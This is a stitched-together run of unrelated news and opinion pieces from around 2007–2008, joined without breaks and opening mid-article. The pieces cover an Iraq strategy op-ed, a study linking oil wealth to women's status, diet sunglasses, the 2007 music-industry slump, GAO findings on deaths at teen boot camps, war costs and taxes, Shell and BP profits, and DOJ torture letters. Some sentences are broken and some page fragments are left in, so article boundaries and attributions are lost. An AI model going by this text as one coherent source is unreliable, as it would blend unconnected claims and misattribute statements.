Functioning as states within the states and by brutal demonstrations of the inability of established governments to protect their populations , such organisations as Hezbollah in Lebanon , the Mahdi army in Iraq and the Al Qaeda groups all over the Middle East seek to reassert an Islamic identity submerged , in their view , by Western secular institutions and values .
Any enhancement of radical Islamist self - confidence therefore threatens all the traditional states of the region , as well as others with significant Islamic populations , from Indonesia through India to Western Europe .
The most important target is the United States , as the most powerful country of the West and the indispensable component of any attempt to build a new world order .
The disenchantment of the American public with the burdens it has borne alone for nearly four years has generated growing demands for some form of unilateral withdrawal , usually expressed in the form of benchmarks to be put to the Baghdad government which , if not fulfilled in specific time periods , would trigger American disengagement .
But under present conditions , withdrawal is not an option .
American forces are indispensable .
They are in Iraq not as a favour to its government or as a reward for its conduct .
They are there as an expression of the American national interest to prevent the Iranian combination of imperialism and fundamentalist ideology from dominating a region on which the energy supplies of the industrial democracies depend .
An abrupt American departure will greatly complicate efforts to help stem the terrorist tide far beyond Iraq ; fragile governments from Lebanon to the Gulf will be tempted into pre-emptive concessions .
It might drive the sectarian conflict within Iraq to genocidal dimensions beyond levels that impelled American intervention in the Balkans .
Graduated withdrawal would not ease these dangers until a different strategy is in place and shows some progress .
For now , it would be treated both within Iraq and in the region as the forerunner of a total withdrawal , and all parties would make their dispositions on that basis .
President Bush ’s decision should therefore not be debated in terms of the “ stay the course ” strategy he has repeatedly disavowed in recent days .
Rather it should be seen as the first step towards a new grand strategy relating power to diplomacy for the entire region , ideally on a nonpartisan basis .
The purpose of the new strategy should be to demonstrate that the US is determined to remain relevant to the outcome in the region ; to adjust American military deployments and numbers to emerging realities ; and to provide the maneuvering room for a major diplomatic effort to stabilise the region .
Of the current security threats in Iraq — the intervention of outside countries , the presence of Al Qaeda fighters , an extraordinarily large criminal element , the sectarian conflict — the United States has a national interest in defeating the first two ; it must not involve itself in the sectarian conflict for any extended period , much less let itself be used by one side for its own sectarian goals .
The sectarian conflict confines the Iraqi government ’s unchallenged writ to the sector of Baghdad defined as the Green Zone protected by American forces .
In many areas the militias exceed the strength of the Iraqi national army .
Appeals to the Iraqi government to undertake reconciliation and economic reforms are not implemented , partly because the will to do so is absent but essentially because it lacks the power to put such policies in place , even if the will to do so could suddenly be mobilised .
If the influence of the militias can be eliminated — or greatly reduced — the Baghdad government would have a better opportunity to pursue a national policy .
The new strategy has begun with attempts to clear the insurrectional Sunni parts of Baghdad .
But it must not turn into ethnic cleansing or the emergence of another tyrannical state , only with a different sectarian allegiance .
Side by side with disarming the Sunni militias and death squads , the Baghdad government must show comparable willingness to disarm Shia militias and death squads .
American policy should not deviate from the goal of a civil state , whose political process is available to all citizens .
As the comprehensive strategy evolves , a repositioning of American forces from the cities into enclaves should be undertaken so that they can separate themselves from the civil war and concentrate on the threats described above .
The principal mission would be to protect the borders against infiltration , to prevent the establishment of terrorist training areas or Taleban - type control over significant regions .
At that point , too , significant reductions of American forces should be possible .
Such a strategy would make withdrawals depend on conditions on the ground instead of the other way around .
It could also provide the time to elaborate a cooperative diplomacy for rebuilding the region , including progress towards a settlement of the Palestine issue .
For such a strategy , it is not possible to jettison the military instrument and rely , as some argue , on purely political means .
A free - standing diplomacy is an ancient American illusion .
History offers few examples of it .
The attempt to separate diplomacy and power results in power lacking direction and diplomacy being deprived of incentives .
Diplomacy is the attempt to persuade another party to pursue a course compatible with a society ’s strategic interests .
Obviously this involves the ability to create a calculus that impels or rewards the desired direction .
The outcome , by definition , is rarely the ability to impose one ’s will but a compromise that gives each party a stake in maintaining it .
Few diplomatic challenges are as complex as that surrounding Iraq .
Diplomacy must mediate between Iraqi sects which , though in many respects mortal enemies , are assembled in a common governmental structure .
It needs to relate that process to an international concept involving both Iraq ’s neighbours and countries further away that have a significant interest in the outcome .
Two levels of diplomatic effort are necessary :
(1) The creation of a contact group , assembling neighbouring countries whose interests are directly affected and which rely on American support .
This group should include Turkey , Saudi Arabia , Egypt and Jordan .
Its function should be to advise on ending the internal conflict and to create a united front against outside domination .
(2) Parallel negotiations should be conducted with Syria and Iran , which now appear as adversaries , to give them an opportunity to participate in a peaceful regional order .
Both categories of consultations should lead to an international conference including all countries that will have to play a stabilising role in the eventual outcome , specifically the permanent members of the UN Security Council as well as such countries as Indonesia , India and Pakistan .
Too much of the current discussion focuses on the procedural aspect of starting a dialogue with adversaries .
In fact , a balance of risks and opportunities needs to be created so that Iran is obliged to choose between a significant but not dominant role or riding the crest of Shia fundamentalism .
In the latter case , it must pay a serious , not a rhetorical , price for choosing the militant option .
An outcome in which Iran is approaching nuclear status , because of hesitant and timid non-proliferation policies in the UN Security Council , coupled with a political vacuum in front of it in the region must lead to catastrophic consequences .
Similar principles apply to the prospects for settlement in Palestine .
Moderates in both the Arab countries neighbouring Israel and in Israel are evolving compromises unimaginable a decade ago .
But if the necessary outcomes are perceived as the result of panic by moderates and an exit from the region by the United States , radicals could raise unfulfillable demands and turn the peace process against the moderates .
In all this , the United States cannot indefinitely bear alone the burden for both the military outcome and the political structure .
At some point , Iraq has to be restored to the international community , and other countries must be prepared to share responsibilities for regional peace .
Some of America ’s allies and other affected countries seek to escape the upheavals all around them by disassociating from the United States .
But just as it is impossible for America to deal with these trends unilaterally , sooner or later a common effort to rebuild the international order will be imposed on all the potential targets .
The time has come for an effort to define the shoals within which diplomacy is obliged to navigate and to anchor any outcome in some broader understanding that accommodates the interests of the affected parties .

Study : Oil , not Islam , responsible for oppressed women Nick Juliano
Published : Monday March 10 , 2008

This A new study upends the prevailing belief that women in the Middle East are oppressed because of their societies ' adherence to hard - line Islamic teachings .
Far more significant in predicting how women will fare in a given country is that nation 's oil wealth .
Political science professor Michael Ross argues in a new paper ( . pdf ) that oil booms put more men than women into the workforce and decrease women 's political representation .
" As a result , oil - producing states are left with atypically strong patriarchal norms , laws , and political institutions , " writes Ross , a professor at the University of California Los Angeles .
Ross argues that strong oil economies put women at a disadvantage because the sectors most in need of employees , especially construction , favor men , while textile and other manufacturing industries that traditionally preferred female employees become less vital in the import - rich nations .
Ross 's paper , " Oil , Islam , and Women , " was published in February by the American Political Science Review .
The Washington Post reported on the paper Monday : Ross 's insight is that this realignment punishes women , because low - wage manufacturing jobs -- especially in the textile industry -- have long been the entry point into the workforce for millions of poor women across the world .
Oil booms cause these jobs to vanish .
By contrast , the boom in construction helps men , because the industry is heavily male - dominated .
Oil booms do create retail jobs , but in many countries these are also closed off to poor women , either because they are uneducated or because traditional mores frown on women interacting with strangers .
The loss of jobs has profound consequences on women 's political engagement and power .
Several studies show that across the world , leaving home and entering the workplace produces greater political awareness and participation among women .
These , in turn , help produce egalitarian family and inheritance laws , and increased voting , economic and legal rights .
" Patriarchal norms are often very deeply embedded in society , and it takes a very powerful force to begin to break them up , " Ross said .
" Women 's employment in these industries has historically been that powerful force , that foot in the door , that first rung on the ladder . "
Environmental Web site Grist reported on a recent talk Ross gave at Brown University and built on his case to argue against increased oil production .
" The upshot : more diversified , clean - energy economies may promote gender equality in ways that direct attempts to reduce the role of religious traditions in society might not , " wrote Grist 's Nathan Wyeth .
" And the bottom line : coal may be the enemy of the human race , but in developing countries , oil may specifically be the enemy of women 's empowerment . "
You 've all heard that joke about a chubby guy or gal being on a " see food " diet .
Well , a Japanese company named Yumetai seems to have given some serious thought to the matter , creating dieter 's sunglasses with deep blue lenses that make the food you 're eating look , well , disgusting .
There 's more to it than that - according to Yumetai , there 's a scientific explanation behind these sunglasses and the lenses are blue for a very good reason : the color blue acts to calm the brain 's appetite center .
At the same time , the lenses block rays of red light which tend to stimulate the appetite .
Make sense ?
Hey , if you 're a desperate dieter you 'll believe just about anything but if you think about it , there are n't many obese Japanese walking around outside the sumo dojo .
If you want to put the diet sunglasses to the test , you can order them online from the Yumetai website for just 1,890 yen ( about $ 19 ) plus shipping .
The aviator - style sunglasses weigh just 25 grams ( about an ounce ) and are made in Japan .
Considering the many millions of dollars Americans lay out on diet remedies every year , it may be time for a new approach .
Plus , the fact that many fattening foods already look disgusting does n't seem to stop those intent on pigging out in style .
What have you got to lose ?
Well just maybe , your appetite !
In the first installment of our three - part series on the future of music , we take a look back at what went wrong and when .
In April , Trent Reznor released Year Zero , a concept album about a future society teetering on the brink of apocalypse .
It was supposed to be a grand work of fiction , but it could just as easily have been about the music industry in 2007 — a bleak , burned - out world where the sky fell on a daily basis and the rivers ran red with the blood of record execs .
( That the album did n't sell well only furthers the analogy ... )
Make no mistake about it , 2007 was a b - a - a - a-d year for the industry .
According to Nielsen SoundScan , album sales were down 15 percent from 2006 ( a trend that 's continued for eight straight years now ) ; big - name artists jumped ship in increasingly complicated — and messy — ways ; and the powers - that - be seemed to get even more heartless and disconnected , thanks to a series of lawsuits , feuds and terrible decisions .
In fact , you could probably say that 2007 was Year Zero .
Things started to change because they could n't possibly get any worse .
In the first installment of our three - part series on the future of the music industry that is rolling out this week , here 's a blow - by - blow recap of just how bad the year was ...
The Future Of Music
Part 1 : The Year The Music Industry Broke :
In 2007 , CD sales continued their freefall and superstars began bailing from major labels .
And that 's just the beginning ...
Part 2 : What Makes A Star These Days ?
CD sales are just a small part of it .
We take a look at other ways artists are getting their names out there and making money ...
Part 3 : The Future : What will the music industry be like in a year ?
Five years ?
We spoke with experts — they do n't know either but have some fascinating theories ...
: The " Dreamgirls " soundtrack tops the Billboard albums chart with sales of just over 60,000 copies .
It 's the lowest sales total for a # 1 album in SoundScan 's 16 - year run , beating the record set thewhen the soundtrack landed at # 1 with sales of 66,000 copies .
January 30 : Sony BMG announces that it has reached a proposed settlement with the Federal Trade Commission that would allow consumers to trade in CDs with the controversial self - installing " rootkit " antipiracy software — which the company had included without consumers ' knowledge — " through June 31 , " according to a press release ( of course , in keeping with the less - than - forthright spirit of the whole rootkit issue , there are only 30 days in June ) .
The company also agrees to pay up to $ 150 to repair any damage to computers caused by users trying to remove the digital - rights - management software , which was revealed to cause serious security risks .
The settlement also calls for Sony BMG to disclose any limitations on consumers ' use of the music CDs , and prohibits the company from collecting user information for marketing purposes and from installing software without users ' consent .
Sony is also required to provide a way for users to easily uninstall the rootkit software .
March 5 : In a blow to small Internet radio , the Copyright Royalty Board — made up of three copyright - royalty judges appointed by the librarian of Congress — significantly increases the royalties paid to musicians and record labels for streaming digital songs online , ending a discounted fee for small Internet broadcasters .
Under the ruling , the current rate of $ 0.08 each time a song is played will more than double by 2010 .
In April , a coalition of webcasters , including National Public Radio , attempts to request a new hearing , but the Royalty Board rejects the appeal , and on July 15 , the royalty hike goes into effect .
In November , both AOL and Yahoo contemplate shuttering their Web radio services due to the increased royalties .
March 21 : Paul McCartney leaves longtime label EMI to sign with Starbucks ' new record label , Hear Music .
His album , Memory Almost Full , is released in June through both traditional retailers and more than 6,000 Starbucks locations in the U.S. , and sells more than 160,000 copies in its first week .
" For me , the great thing is the commitment and the passion and the love of music , " McCartney tells an audience of Starbucks shareholders .
" It 's a new world now and people are thinking of new ways to reach the people , and for me that 's always been my aim . "
June 11 : In a move that would have seemed unimaginable in the label - driven industry of old , Kelly Clarkson feuds openly with the head of her label — Sony BMG head Clive Davis , for decades one of the most powerful industry executives — and parts ways with her management company , the Firm , amid controversy about her upcoming album My December .
Three days later , concert promoter Live Nation announces that Clarkson 's summer tour in support of the album has been canceled due to underwhelming ticket sales .
My December hits stores later in the month , and sells more than 290,000 copies in its first week , giving Clarkson the # 2 album in the country — behind the " Hannah Montana " soundtrack — but shows little staying power .
Clarkson later apologizes for her remarks .
July 10 : Canadian indie outfit Stars make their new album , In Our Bedroom After the War , available for download just 10 days after completing it — and some three months before its scheduled release date .
The move is done with the blessing of their label , Arts& Crafts , and the album becomes a mainstay on the iTunes Music Store 's most - downloaded list .
July 15 : Prince ticks off his U.K. record label and Britain 's Entertainment Retailers Association when he decides to release his new album , Planet Earth , for free with the Sunday edition of the British newspaper The Mail .
It 's estimated that 2.27 million people receive the album , which helps boost sales of tickets for his 21 - night stand at London 's O2 arena .
" It 's direct marketing , and I do n't have to be in the speculation business of the record industry , which is going through a lot of tumultuous times right now , " Prince says .
September 19 : Kanye West's Graduation sells nearly 957,000 copies to claim the top spot on the Billboard albums chart .
50 Cent 's Curtis bows at # 2 with sales of more than 691,000 .
Both are the best first - week numbers of 2007 ( besting Linkin Park 's Minutes to Midnight , which scanned 623,000 copies in May ) , and Graduation notches the biggest first week in nearly two years — beating , interestingly , West 's Late Registration , which sold more than 860,000 copies when it was released in September 2005 .
October 1 : Radiohead shock fans by announcing on their blog that not only have they completed their much - anticipated new album , In Rainbows , but that " it 's coming out in 10 days , " via download — leading to reams of " this is a taste of the future of albums " - type commentary .
The bandmembers , who have been free agents since the release of 2003 's Hail to the Thief , decide to release the album by themselves in two formats : download - only , which allows fans to name their price for the album , and as a deluxe " discbox " version ( priced at approximately $ 80 ) .
October 4 : The Recording Industry Association of America wins its first case against file - sharing , when a jury finds 30 - year - old Brainerd , Minnesota , resident Jammie Thomas guilty of copyright infringement .
In question were 24 music files she allegedly posted on the peer - to - peer site Kazaa .
Thomas is ordered to pay $ 220,000 in fines — or $ 9,250 per song file .
Her lawyers appeal the ruling , on the grounds that it is " unconstitutionally severe , " but in December , the U.S. Department of Justice intervenes , urging the courts not to rule on the constitutionality of the damages , as " Copyrights are of great value , not just to their owners , but to the American public as well . "
October 8 : Trent Reznor announces the end of his 13 - year relationship with Interscope Records , writing on his site , " As of right now , Nine Inch Nails is a totally free agent , free of any recording contact with any label .
...
It gives me great pleasure to be able to finally have a direct relationship with the audience as I see fit . "
He then goes on to write that there are " exciting times " ahead .
And he 's not kidding : Within a week , he promises ( threatens ? ) to scuttle Interscope 's release of a Year Zero remix album by leaking tracks from it to the Internet , then announces that he 's partnering with Saul Williams to release The Inevitable Rise and Liberation of Niggy Tardust !
via download , and gets into a public argument with the Universal Music Group over the legality of a proposed fan - only remix site , before deciding to launch the site himself .
October 9 : One day before downloads of In Rainbows are scheduled to begin , Radiohead send an e-mail to those who 've ordered it , stating that the album will be encoded at 160 kilobits per second , a rate far inferior to their other LPs , which are all available for download at 320 kbps ( or most MP3s floating around file - sharing sites like OiNK , for that matter ) .
This angers many fans , who feel that the band duped them by not announcing the encoding rate upfront , and the bad feelings are only furthered when Radiohead 's managers give an interview to a British trade mag , in which they suggest the download version of In Rainbows is a promotional tool for the actual CD .
October 10 : In Rainbows is made available for download .
Over the next two months , much speculation ensues as to just how many people downloaded it and exactly how much they paid to do so :
Early reports have more than 1.2 million fans downloading it at an average price of $ 8 , though later findings by comScore , a company that measures consumer activity online , adds that more than 60 percent of downloaders paid nothing for the album .
Neither Radiohead nor their publicists discuss the financial aspects of the download experiment , though the band does issue a statement dismissing comScore 's findings as " wholly inaccurate . "
October 16 : Madonna finalizes a massive 10 - year deal with Live Nation , believed to be worth $ 120 million .
It 's the largest so - called " 360 deal " in history , involving not only Madge 's future studio albums but her tours , merchandising , film and TV projects , DVD releases and music - licensing agreements .
" For the first time in my career , the way that my music can reach my fans is unlimited , " Madonna says in a statement .
" The possibilities are endless .
Who knows how my albums will be distributed in the future ? "
The deal brings to an end the singer 's 25 - year relationship with Warner Music Group , which has released all of her albums to date .
October 23 : OiNK , " the world 's biggest source for pirated , pre-release albums , " is shut down after a two - year criminal investigation led by Interpol ( the international police organization headquartered in Lyon , France ... not the band ) .
Officers raid the apartment of OiNK 's creator , a 24 - year - old Brit named Alan Ellis , and seize the site 's servers in Amsterdam .
Ellis is arrested on suspicion of conspiracy to defraud and copyright infringement , and the e-mail addresses of the site 's more than 180,000 users are made available to police — though it is not known whether they could face criminal prosecution as well .
Ellis ' trial is scheduled to begin in February .
November 7 : Thanks to a last - minute rule change by the folks at SoundScan , the Eagles ' Wal - Mart - only LP , Long Road Out of Eden , debuts at # 1 on the Billboard albums chart with sales of more than 711,000 copies .
The total nearly triples that of the country 's # 2 album , Britney Spears ' Blackout , and gives the group — which had n't released an album of new studio material in 28 years — the second - highest debut of 2007 .
November 27 : Universal Music Group CEO
Doug Morris gives a disastrous interview to Wired magazine , in which he compares the music industry to a character from the comic strip " Lil ' Abner , " calls college students who download music " criminals " and explains the industry 's inability to keep up with the Internet by saying , " There 's no one in the record company that 's a technologist .
...
It 's like if you were suddenly asked to operate on your dog to remove his kidney .
What would you do ? "
November 28 : Reigning " American Idol " champ Jordin Sparks ' self - titled debut lands at # 10 on the Billboard chart with sales of 119,000 copies .
It 's the lowest first - week sales total for any " Idol " winner — by more than 180,000 copies .
December 3 : Island Def Jam lays off nearly 6 percent of its staff .
Rumors of axings at major labels like Sony BMG and the Universal Music Group begin to swirl — and at press time , it looked like they may have begun .
The Warner Music Group announces that it has cut bonuses for employees , and Terra Firma , the private equity group that owns EMI ( home to Capitol Records ) , reportedly makes " cutbacks a core part of its strategy . "
There are also reports of massive reshuffling at labels like Epic , RCA and Arista .
December 31 : In Rainbows is set to be released to retailers in the U.K. through XL Recordings .
The U.S. release will come one day later , through TBD Records , an offshoot of the Dave Matthews - founded ATO Records .
GAO FINDINGS GAO FINDINGS
The Government Accountability Office examined the deaths of 10 children in private programs .
They found common problems in most cases : • Ineffective management • Untrained staff • Inadequate nourishment • Reckless or negligent operating practices • Inadequate equipment Digg

Facebook WASHINGTON 
The first federal inquiry into boot camps and wilderness programs for troubled teens cataloged 1,619 incidents of abuse in 33 states in 2005 , a congressional investigation out today reveals .
The study , by the Government Accountability Office , also looked at a sample of 10 deaths since 1990 and found untrained staff , inadequate food or reckless operations were factors .
In half of those cases , the teens died of dehydration or heat exhaustion , the GAO says .
NEGLECT : Teens suffered fatal health problems
There are no federal rules governing residential facilities for children , and some states do not license such programs .
The findings are scheduled to be presented at a hearing of the House Committee on Education and Labor , whose chairman , Rep. George Miller , D - Calif. , requested the investigation .
" This nightmare has remained an open secret for years , " Miller said in a statement .
" Congress must act , and it must act swiftly . "
He has sponsored a bill designed to encourage states to enact regulations .
Investigators counted " thousands " of abuse allegations against the facilities using lawsuits and websites .
But there is no central clearinghouse .
States submit incidents to the federal database on a voluntary basis .
Five of the 10 programs where teenagers died under questionable circumstances are operating — sometimes under a new name or in a different location .
The cases highlighted in the GAO report did not include names , but some were identifiable through news reports : • Roberto Reyes , 15 , died of complications from a spider bite in November 2004 at Thayer Learning Center in Missouri , which describes itself as " a military based , Christian boarding school . "
A state investigation concluded that the staff " did not provide adequate treatment , " the GAO said , but the state does not license such programs , and no criminal charges have been filed .
The staff tied a 20 - pound sandbag around his neck when he was too sick to exercise , the GAO said .
The family settled a civil lawsuit against Thayer for about $ 1 million .
The facility 's owners denied wrongdoing .
Messages left at the school and with its lawyer were not returned .
• At the American Buffalo Soldiers boot camp in Arizona where Anthony Haynes , 14 , died in 2001 , children were fed an apple for breakfast , a carrot for lunch and a bowl of beans for dinner , the GAO said .
Haynes became dehydrated in 113 - degree heat and vomited up dirt , according to witnesses .
The program closed , and the director , Charles Long , was sentenced in 2005 to six years in prison for manslaughter .
Tim Briceland - Betts of the Child Welfare League of America says abuses " typically occur in places that are not regulated .
I 'm glad to hear that they are working on this . "

ARROYO GRANDE , Calif. ( MarketWatch ) -- Reason No. 1 : " Most Americans have yet to feel any of the costs of the Iraq war , " write Nobel economist Joseph Stiglitz and Linda Bilmes in an excerpt of their new book , " The Three Trillion Dollar War , " in Vanity Fair .
" The price in blood has been paid by members of the volunteer military .
The price in treasure has been financed entirely by borrowing .
Taxes have not been raised to pay for the war . "
Well , folks , the party 's over .
Campaign rhetoric wo n't hide America 's excesses , denial , incompetence and arrogance much longer .
No matter who 's elected , taxes will increase to cover massive debts .
Greed has driven America 's great economic engine into a " debt contagion " ditch with a recession , bear market , price inflation , and weak job and housing markets ... you bet your taxes will increase .
Yes , our five - year war was totally financed by borrowing .
But unfortunately , " deficit spending gives the illusion that the laws of economics can be repealed .
They cannot .
Americans will have to pay for the war at some point -- and when they do , they will be paying not the Bush markdown but the full price , " the authors say .
We 've been mislead by Washington 's Enron - style accounting that hides many costs :
Supplemental financing bills , outside the budget
No veterans health - care estimates included
No equipment replacement costs to restore our military
Nothing about increases in state and homeland security
The real cost is n't $ 800 billion , it 's already $ 3 trillion .
And still , it does n't include ...
Interest on the ever - increasing $ 9.3 trillion federal debt
Damage to our credibility from a weak dollar
Out - of - control inflation in energy
And the brutal damage to Iraq and other Gulf states
Washington 's hiding all that from us .
We were sold a war - on - the - cheap , to cost a mere $ 50 billion to $ 60 billion , to be self - financed out of oil revenues .
Today we 're spending $ 50 billion every month !
This war is already an economic disaster for America and the bill 's still coming due .
Still , we know there 's strong opposition to taxes .
But can a new president change much ?
Certainly not with two - thirds of the budget in untouchable entitlements and interest costs .
Besides , Washington 's not run by our 537 elected officials but by 35,000 lobbyists .
And after the elections , all 35,537 will still be part of a conspiracy that hates change and loves to spend the $ 3 trillion Federal budget .
Mark my words :
Taxes will ( must ! ) be increased to recover from years of excessive spending , accumulating deficits and future earmarks .
A new president may expose the problems but without Congressional restraint the taxpayers will get stuck paying " the full price . "
Frankly , since both parties are mired in narrow ideologies , it 's questionable whether either can manage a $ 15 trillion GDP economy .
Read " Mismanagement 101 , " Dan Gross 's Newsweek column : " As oil hovered near $ 100 a barrel , President Bush complained to OPEC about high oil prices .
OPEC president Chakib Khelil responded acidly that crude 's remarkable run had nothing to do with the reluctance of Persian Gulf nations to pump oil , and everything to do with the ' mismanagement of the U.S. economy . ' "
And our heavy reliance on borrowing keeps making it even more difficult for the next president .
But unfortunately , even though the party 's over , that $ 3 trillion war debt is just a fraction of America 's out - of - control debt which is bigger than the official $ 9.3 trillion federal debt .
It 's reason No. 1 taxes are going up .
Here are another nine problems increasing our government 's debt and adding pressures for new tax hikes .
I 'm sure you can think of many others :
2. America 's new Wall Street welfare program
This one 's scary .
For the first time in almost a century , the Fed 's bailing out the investment bankers , those wild speculators who got us in this mess -- bailed out while two million homeowners face foreclosures and increasing interest rates .
The real sinners are free to sin again !
Like J.P. Morgan Chase 's $ 2 -- now $ 10 -- freebie of Bear Stern 's equity , while the Fed stuck the taxpayers with billions of Bear 's junk debt .
Now Wall Street 's greedy traders are free to start speculating again , playing in the same old $ 516 trillion high - risk derivatives casino .
Bad move : The Fed 's setting America up for an even bigger crash around 2012 .
3 . The Fed 's nationalizing America 's financial industry
Bear Sterns is a symptom of a systemic disease .
As BusinessWeek put it : " Financiers preached the free - market gospel and pocketed unheard - of sums of money , yet when times got tough they called for a government bailout . "
The Fed 's dealing with America like a third - world banana republic , effectively nationalizing our financial industry !
Wall Street 's speculators have over $ 200 billion in junk write - offs .
But like the government accounting tricks hiding war costs , Wall Street has also been inflating junk asset values and ginning up profits .
And now the Fed 's even helping them mask losses to prevent panic .
Eventually this PR stunt will cut Wall Street 's future earnings and increase taxes .
4 . Huge resistance to cutting social and entitlement programs
Lobbyists like AARP will fight all cutbacks in Medicare and Social Security entitlements , even though those unfunded benefits will balloon to $ 50 trillion to $ 65 trillion within a generation .
Economists say solving this problem will take Draconian cuts of 40 % in benefits or tax increases of 40 % .
If we do n't , entitlements will consume the entire budget in a generation .
Untouchable near - term : Ergo , minimal cuts , higher taxes .
5. America 's pork barrel lobbying machine
The Washington Post says lobbying is " Washington 's biggest business . "
All those 35,000 lobbyists will be around for the entire 2009 - 2012 first term of the next president , and all screaming for government handouts .
The Democrats need them .
And while McCain promises to veto earmarks , his campaign 's inner circle is made up of special interest lobbyists , ostensibly working for " free . "
Expect little change .
Lobbyists earn big bucks squeezing megabucks out of the federal budget , and your taxes pay the bills .
6 . White House 's free market nonaction policies
" We 're on top of it , " said the President in his St. Patrick 's Day speech at the New York Economics Club , as if the credit meltdown had little effect on the economy .
The Treasury secretary even got a Katrina - style " great job , Hank " for working one whole weekend to magically fix the crisis .
Unfortunately , the Treasury and the Fed are following the same playbook that pushed the 1970s economy into a long , deep recession .
Pimco's Bill Gross says we need an aggressive Rooseveltian fiscal package .
No chance .
This administration only knows a free market ( for business ) and tax cuts ( for the top ) .
7 . Aging infrastructure : roads , bridges , water , sewer , etc .
Imagine taking that $ 50 billion monthly cost of fighting and rebuilding Iraq and shifting it to upgrading our own highways , hospitals , power , sewer and water plants .
Dream on .
Yet our deterioration continues and deferred maintenance only works so long .
Expect higher gas taxes , plus sizeable cutbacks in state and local services , or general tax increases .
8. Paradigm shift : consumer spending vs. consumer savings
In one generation our savings rate declined below zero .
Policymakers favored a consumer - driven economy , capital formation fell and debt piled up .
Meanwhile , consumers took a cue from an out - of - control " spend and borrow " government piling up huge deficits .
9 . Recession reality replacing arrogant optimism
The past five years the Wall Street Bubble Machine relied on an artificially low 1 % Fed rate to create the housing boom and then the subprime - credit meltdown .
Meanwhile our optimism and faith in capitalism sank with all the phony asset values and stock prices concocted by Wall Street ... and it'll happen again ... because Wall Street 's relentless , all - consuming greed is setting up the economy to crash and burn again , all too soon ... and the taxpayer will pick up the tab ... again .
10 .
Now your turn , what 's your top reason taxes will increase ?

Shell reported record UK profits in January Oil firms Royal Dutch Shell and BP have made better - than - expected first - quarter profits thanks to the rising price of oil , which is close to $ 120 a barrel .
Shell made profits of $ 7.8 bn ( £ 3.9 bn ) in the first three months of the year , up from $ 6.9 bn a year ago .
And rival BP saw its profits rise 48 % to $ 6.588bn ( £ 3.31bn ) , from $ 4.4bn .
In January , Anglo - Dutch firm Shell reported annual profits of $ 27.56 bn ( £ 13.9bn ) for 2007 , a record for a UK - listed company .
BP shares closed up 5.96 % in London , while Royal Dutch Shell ' A ' shares rose 5.26 % .
Price moves
The quarterly results come amid increasing concern at the cost of petrol on both sides of the Atlantic .
HAVE YOUR SAY
Oil company profits are justified but the governments slice of the cash we pay per litre is not Peter , Aylesbury , UK In the UK , average prices have now reached 109.8 p a litre for unleaded petrol , equivalent to £ 4.99 a gallon ( 4.55 litres ) , according to the AA .
In the US , where fuel taxes are lower , the average price is now $ 3.60 ( £ 1.80 ) for an American gallon ( 3.79 litres ) , according to the US Energy Department .
The results also follow a strike by oil workers at the Grangemouth refinery in Scotland , which had disrupted fuel supplies and halted much of the UK's North Sea oil production .
Some petrol stations in Scotland and northern England had introduced rationing or raised prices .
The price of oil prices has been rising steadily since January , when it broke through the $ 100 - a - barrel mark .
This week the cartel of oil producing nations , Opec , warned that prices could reach $ 200 a barrel .
On Monday , US light , sweet crude hit a fresh record of $ 119.93 a barrel .
Prices rose as traders eyed the disruption caused by the Grangemouth strike and supply problems in Nigeria following pipeline attacks .
However , the oil price slipped to $ 117.64 a barrel in Asian trade on Tuesday .
Difficult year
Shell chief executive Jeroen van der Veer said he would continue to grow the firm after a " good operating performance " .
Shell shares are listed in the UK and the Netherlands , while the company 's headquarters are in The Hague .
Royal Dutch Shell A shares Royal Dutch Shell B shares BP shares BP 's strong figures come after 12 months of turmoil for the firm , which announced a fall in 2007 's annual profits in February .
At the time it also announced that it was to cut 5,000 jobs .
Other low points have included receiving a $ 50 m fine for the 2005 Texas City refinery explosion in which 15 people died .
This was part of a larger $ 373 m fine by the US Department of Justice for committing environmental crimes and fraud , and included a fine for price manipulation .
And in May last year , the company 's boss , Lord Browne , resigned after lying to a court in an attempt to block stories about his private life .
' Oil scarcity '
For a litre of petrol costing 108 pence , approximately 33 pence goes to the oil company , 9 pence to the retailer , 50 pence fuel duty to the Chancellor of the Exchequer , and 16 pence VAT to the chancellor .
Simon Wardell , oil analyst at Global Insight , said the rising price of petrol was " predominantly down to high oil prices " .
" Oil prices are high because of the weak dollar and because reserves are under pressure , there is a slim spare capacity margin - Opec does not have a great deal more oil to pump , " he said .
" That scarcity is reflected in the high oil prices . "
But he said that oil firms could not sit back and just watch the profits flow in .
" Oil firms have to think about the long - term investment , and what prices might be in the future . "
The earnings results come ahead of other earnings data in coming weeks from industry figures including US giants Exxon Mobil and Chevron , UK gas firm BG Group and France 's Total .

What are these ?
The Sunday New York Times brings new revelations of the Bush administration ’s ever - evolving legal rationale for torture .
Like the hydra , lopping off one legal argument only leads to another .
The only thing that remains constant is that the administration can do whatever it wants to those in CIA custody .
Today ’s revelation is of a set of letters between Senator Wyden and the Department of “ Justice ” on the legal basis for the CIA ’s “ enhanced interrogation , ” aka torture , program .
The letters seek to clarify the reasoning and impact of President Bush ’s executive order last summer that reauthorized CIA torture .
Sandy Levinson at Balkinization explains why the reasoning in the letters will justify virtually any torturous action .
Levinson starts by quoting from the Times article :
In one letter written Sept. 27 , 2007 , Mr. Benczkowski [ a deputy assistant Attorney General ] argued that “ to rise to the level of an outrage ” and thus be prohibited under the Geneva Conventions , conduct “ must be so deplorable that the reasonable observer would recognize it as something that should be universally condemned . ”
There is , of course , a certain logical paradox here :
The very fact that the some US interrogator would suggest that some particular conduct is “ reasonable ” in some situation would , by definition , mean that there is not “ universal ” condemnation of the practice .
This is especially true if one accepts the DOJ argument that “ The fact that an act is undertaken to prevent a threatened terrorist attack , rather than for the purpose of humiliation or abuse , would be relevant to a reasonable observer in measuring the outrageousness of the act . ”
Once one allows what might be termed “ purity of utilitarian motive ” to dominate the analysis , the game is over , for there will always be those who will argue that it is worth doing practically anything to forestall any “ terrorist attack . ”
A reading of the letters shows that they admit that “ torture ” is always banned , but that they seek to redefine the constraints of the Geneva Conventions Common Article 3 , so that the banned “ outrages upon personal dignity ” depend upon a “ shocks the conscience ” definition of prohibited conduct .
This criterion is combined with the question of whether activities are “ for the purpose of humiliation and abuse ” [ emphasis added ] .
Thus , the sentence reads :
Similarly , the fact that an act is undertaken to prevent a threatened terrorist attack , rather than for the purpose of humiliation and abuse , would be relevant to a reasonable observer in measuring the outrageousness of the act .
As David Luban explained , the “ shocks the concsience ” is extremely problematic and can be bent to justify almost anything behavior .
See also Luban ’s “ Were You Really Surprised ? ” where he explains how :
the Justice Department already told us that no interrogation tactic can possibly be cruel , inhuman , and degrading .
In some sense , the only surprise is that Congress now acts surprised .
Why the outrage now ?
DoJ told them its position more than two years ago , in a letter to three Democratic Senators .
